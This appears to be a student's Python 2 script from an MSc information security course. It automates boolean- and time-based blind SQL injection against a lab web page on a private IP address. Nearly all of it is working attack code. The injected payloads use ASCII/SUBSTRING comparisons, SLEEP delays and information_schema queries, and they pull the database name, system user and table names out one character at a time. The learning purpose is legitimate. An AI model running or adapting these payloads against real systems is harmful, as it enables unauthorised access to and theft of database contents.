import urllib2, sys, urllib, hashlib, argparse
"""
    Project Sql injection
    Hercules Symeonidis
    MTE 1132
    Under the purpose of course ..
    At Msc Digital Informantion Security
"""

"""
OpenUrlConnection function is responsible for managing HTTP connections.
It takes two arguments as input, 
base_url: the vulnerable url to SQL injection 
blind_sqli_url: the concat Url that applies the sql injection"""
def OpenUrlConnection(base_url,blind_sqli_url):
    blind_sqli_url_q = urllib.quote_plus(blind_sqli_url)
    
    #concat urls
    url = base_url + blind_sqli_url_q
    #create request for the entire path
    url_request = urllib2.Request(url)
    #if the base_url is correct url_response return the content of the website.
    #Otherwise returns a specific error. 
    try: 
        url_response = urllib2.urlopen(url_request)
    except urllib2.HTTPError, e:
        print'HTTPError = ' + str(e.code)
    except urllib2.URLError, e:
        print 'URLError = ' + str(e.reason)
    return (url_response.read())

"""
BlindSqli is the core function of this script
Input: takes three values as input
    base_url: is the vulnerable url
    payload: the sql query that apply the sql injection
    multiple_values: if the result have more than one result
Process: Search character by character the ascii map, from 32 to 127 and check if the result is the same as a != True result (False) of a page.
    if it is, then if the process needs to end or to continue for the next character
Output: Return the result character to character of wait for the process to complete and then print the results.
"""
def BlindSqli(base_url, payload, multiple_values):
    #indicate the position of the character finding
    character_position = 1
    #indicate at multivalue conditions the next phrase - word
    multivalue_position = 1
    #this variable is used to check the end of the search process.
    #If the process goes to an endless loop this indicator is a metric tool
    multivalue_indicator = 1
    #value flag that indicates if the process needs to end (True). By default is False.
    flag_finish = False
    #Is a string that append the results of the process character by character
    string_append = ""
    #While flag_finish is False, while continue to loop.
    while (flag_finish != True):
        #ascii_decimal_num takes values from 32 to 126.
        for ascii_decimal_num in range(32,127):
            #Check if the script needs to return multiple values
            if multiple_values == True:
                #Variable blind_sqli_url store the result of the dynamic variable assignment
                blind_sqli_url =  payload % (str(character_position),str(multivalue_position),str(ascii_decimal_num))
            else:
                blind_sqli_url =  payload % (str(character_position),str(ascii_decimal_num))
            #Variable result_url_content stores the result of the url request
            result_url_content = OpenUrlConnection(base_url,blind_sqli_url)
            #if this request is false this means that we have a blind sql injection and we must do something about this
            if (hash_url(result_url_content) == false_url_hash):
                #we store the character converted from int to char
                character = chr(ascii_decimal_num)
                #we will go for the next one
                character_position +=1
                #this condition check if range function has start again to count
                if ascii_decimal_num == 32:
                    if multiple_values == False:
                        #if we have a single value we go off at the second loop and we set the flag_finish to trigger a stop, to finish the process
                        flag_finish = True
                        break
                    #if multiple values is set to True then we should search for the next phrase/word
                    elif multiple_values == True:
                        #Variable multivalue_indicator if it is greater than 1 then we have detect an endless loop and we shoulf finish the process
                        if multivalue_indicator >1:
                            #
                            flag_finish = True
                            break
                        #if the multivalue_indicator == 1 then we go for the next phrase//word
                        #set character_position to the first position of the phrase/word
                        character_position = 1
                        #increase the  multivalue_position pointing to the next phrase/word
                        multivalue_position += 1
                        #increase the endless loop indicator
                        multivalue_indicator += 1  
                    print ""                      
                else:
                    sys.stdout.write(character)
                    string_append += character 
                break
            else:
                ascii_decimal_num +=1
                multivalue_indicator = 1
    return string_append

"""
Hash_url takes the url content of a page,
creates the hash md5 digest and return this value
"""
def hash_url(url):
    url_hash= hashlib.md5()
    #takes the url creates a hash_digest
    url_hash.update(url)
    return url_hash.digest()

#Needs to set to global as it will be in use of at the BlindSqli function
global false_url_hash

"""
parser = argparse.ArgumentParser(description="calculate X to the power of Y")
#parser.add_argument("-u", "--url", action="store_true", dest = "target_url", help="Specify which SQL injection type to test for. T: Time-based blind,B: Boolean-based blind")
#parser.add_argument("-t", "--technique", action="store", choices = ['T', 'B'], dest = "technique", help="Specify which SQL injection type to test for. T: Time-based blind,B: Boolean-based blind")
#parser.add_argument("--tables", action="store", dest = "tables", help = "Enumerate DBMS database tables")
#parser.add_argument("-d", "--database", action="store", dest = "database", help = "Enumerate DBMS database tables")
#parser.add_argument("-su", "--system-user", action="store", dest = "system_user", help = "Enumerate DBMS database tables")
parser.add_argument('--version', '-v', action='version', version='%(prog)s 1.0')
args = parser.parse_args()


#....
if args.target_url:
    base_url = args.target_url
else:
    print "Run -h or --help to ...."
"""

base_url = "http://192.168.2.7/SQLiMe/Lesson02/index.php?id=1"
false_url_hash = hash_url(OpenUrlConnection(base_url, " AND false"))

enum = 'dump_tables'
technique = 'B'

"""
Notes: don't take into account
PATTERN ~1 " AND ORD(MID((IFNULL(CAST("+mysql_command+" AS CHAR),CHAR(32))),%s,1)) > %s"
PATTERN ~2 " AND ASCII(SUBSTRING("+mysql_command+",%s,1))> %s"
"""

#different cases that this script implements
if enum == 'database':
    multiple_values = False
    mysql_command = 'database()'
    if technique == 'B':
        payload = " AND ASCII(SUBSTRING("+mysql_command+",%s,1))> %s"
    elif technique == 'T':
        payload = " AND 928 = IF(ASCII(SUBSTRING("+mysql_command+",%s,1))> %s,928,SLEEP(2))"
elif enum == 'system_user':
    multiple_values = False
    mysql_command = 'system_user()'
    if technique == 'B':
        payload = " AND ASCII(SUBSTRING("+mysql_command+",%s,1))> %s"
    elif technique == 'T':
        payload = " AND 928 = IF(ASCII(SUBSTRING("+mysql_command+",%s,1))> %s,928,SLEEP(2))"
elif enum == 'dump_tables':
    #This script dump db tables from the current db providing a little more level of complexity
    #dump tables means more than one results
    multiple_values = True
    #To dump all the tables from a database we should fird find the current database.
    payload = " AND ASCII(SUBSTRING(DATABASE(),%s,1))> %s"
    db_name = "0x"+BlindSqli(base_url, payload, False).encode("hex")
    print ""
    if technique == 'B':
        payload = " AND (select ASCII(SUBSTRING(a.table_name,%s,1)) FROM (select table_name, @rownum:=@rownum+1 as rownum from information_schema.tables, (select @rownum:=0)r WHERE table_schema="+db_name+")a where a.rownum=%s)>%s"
    elif technique == 'T':
        payload = " AND 928 = IF((select ASCII(SUBSTRING(a.table_name,%s,1)) FROM (select table_name, @rownum:=@rownum+1 as rownum from information_schema.tables, (select @rownum:=0)r WHERE table_schema=0x4C30324442)a where a.rownum=%s)>%s,928,SLEEP(2))"

#Set if the funtion BlisdSqli needs to run for mulitple values
print BlindSqli(base_url, payload, multiple_values)


"""

# This code runs when script is started from command line
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Enter type of SQL Dump and URL run.')
    parser.add_argument('type', type=int, help='SQL Dump attack type(0:boolean based attack, 1:time based attack)')
    parser.add_argument('url', help='URL to check (with query parameter index.php?ID=1).')
    args = parser.parse_args()
    
    AttackType = args.__getattribute__('type')
    startURL = args.__getattribute__('url')
    # http://IP_ADDRESS/SQLiMe/Lesson02/index.php?id=1
    
    sqldump=Main(AttackType,startURL)
    sqldump.run()

"""



